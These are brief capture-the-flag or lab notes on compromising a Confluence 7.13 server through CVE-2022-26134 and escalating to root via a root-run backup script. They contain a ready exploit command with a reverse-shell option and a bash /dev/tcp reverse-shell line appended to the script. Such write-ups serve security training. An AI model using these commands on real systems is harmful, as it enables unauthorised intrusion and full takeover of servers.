ports 22, 8090, 8091 open
port 8090 has atlassian confluence 7.13.7 login page
8091 redirects to the same

initially, the ?language seems like a good cadidate, turns out, it doesnt really do much

we look for exploit on searchsploit, find one that is for version 8 ish, doesnt work

Looked up exploit for the current version 7.13.6 , and we find CVE-2022-26134 as an interesting one, with a github exploit https://github.com/jbaines-r7/through_the_wire

`python through_the_wire.py --rhost 192.168.233.41 --rport 8090 --lhost 192.168.45.168 --lport 22 --protocol http:// --reverse-shell`
gives us a reverse shell
confluence!

---

we had first found a backup.sh script in /opt, which wasnt visible to be running from crontab, or system timers, or ps -ef
But pspy saw it, root was running the script
So we just need to give us a shell, and we be rooot

so we do 
`echo "bash -c 'bash -i >& /dev/tcp/192.168.45.168/80 0>&1'" >> log-backup.sh`
while listening on port 80, and get rev shell
root!

---
---
---
fell into dumb rabbit hole, cuz
1. assumed anything to do with "backup" would be owned and run by root, and we would only have to create some wildcard stuff
2. assumed since it wasnt owned by root, root wouldnt be running it
3. assumed pspy wouldnt give the answer, after crons dint show anyhtin